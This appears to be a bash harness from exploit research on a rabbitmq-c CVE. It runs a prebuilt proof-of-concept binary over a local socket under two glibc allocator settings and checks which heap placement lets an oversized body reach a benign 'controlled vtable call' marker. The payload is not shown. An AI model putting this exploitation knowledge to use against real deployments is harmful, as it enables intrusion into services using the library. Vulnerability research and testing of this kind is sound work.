#!/usr/bin/env bash
# rabbitmq-c CVE-2026-61547 — allocator-placement causal probe.
#
# Companion to run.sh. Uses that script's already-built svc_reuse binary and
# runs the SAME 65600-byte socket-fed body under two glibc allocator settings:
#   * default: 200000-byte reusable buffer is mmap'd (threshold 131072)
#   * MALLOC_MMAP_THRESHOLD_=300000: the same buffer comes from the brk heap
# Expectation: only the mmap arm reaches the chosen-vtable benign marker.
# This is a measurement of the consumer-side boundary, not a new claim.
# Loopback AF_UNIX only; no library or harness source changes.
set -uo pipefail
OUT=$(cd "${1:-/tmp/rmq2-service-final}" && pwd)
BIN="$OUT/svc_reuse"
[ -x "$BIN" ] || { echo "missing $BIN; run run.sh first" >&2; exit 2; }
pass=0; fail=0
check() { if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass+1)); else echo "FAIL $1"; fail=$((fail+1)); fi; }

DFILE="$OUT/mmap-default.$$.log"
export RMQ2_ADDR_FILE="$OUT/mmap-default.$$.addr.txt"
DSOCK="$OUT/mmap-default.$$.sock"
( timeout 40 "$BIN" service "$DSOCK" > "$DFILE" 2>&1 ) & dpid=$!
sleep 0.4
timeout 20 "$BIN" client "$DSOCK" 65600 41 >> "$DFILE" 2>&1
wait $dpid; unset RMQ2_ADDR_FILE
check "default mmap-backed body reaches chosen-vtable marker" \
  "$(grep -q 'MARKER: controlled vtable call reached' "$DFILE" && echo 1 || echo 0)"

BFILE="$OUT/mmap-brk.$$.log"
export RMQ2_ADDR_FILE="$OUT/mmap-brk.$$.addr.txt" MALLOC_MMAP_THRESHOLD_=300000
BSOCK="$OUT/mmap-brk.$$.sock"
( timeout 40 "$BIN" service "$BSOCK" > "$BFILE" 2>&1 ) & bpid=$!
sleep 0.4
timeout 20 "$BIN" client "$BSOCK" 65600 41 >> "$BFILE" 2>&1
wait $bpid; unset RMQ2_ADDR_FILE MALLOC_MMAP_THRESHOLD_
check "brk-backed body corrupts heap but never reaches the marker" \
  "$([ "$(grep -c 'MARKER: controlled vtable call reached' "$BFILE")" = 0 ] &&
     grep -q 'invalid next size' "$BFILE" && echo 1 || echo 0)"

echo "--- default arm ---"; cat "$DFILE"
echo "--- forced-brk arm ---"; cat "$BFILE"
echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && exit 0 || exit 1
